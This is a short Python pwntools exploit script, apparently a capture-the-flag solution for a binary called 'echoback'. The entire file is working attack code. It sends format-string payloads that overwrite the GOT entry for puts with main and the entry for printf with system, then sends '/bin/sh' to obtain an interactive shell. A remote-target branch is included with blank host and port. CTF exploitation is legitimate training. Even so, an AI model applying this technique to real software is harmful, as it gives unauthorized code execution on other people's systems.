from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'echoback'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

uu64 = lambda x: u64(x.ljust(8,"\x00"))
uu32 = lambda x: u32(x.ljust(4,"\x00"))

if lokal:
    s = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    s = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    cmd = ""
    gdb.attach(s,cmd)

#Exploit Here
puts = elf.got['puts']
main = elf.symbols['main']
printf = elf.got['printf']
system = elf.plt['system']

s.recvuntil("message:\n")
p = fmtstr_payload(7,{puts:main})
s.sendline(p)

p = fmtstr_payload(7,{printf:system})
s.sendline(p)

s.sendline("/bin/sh")


s.interactive()
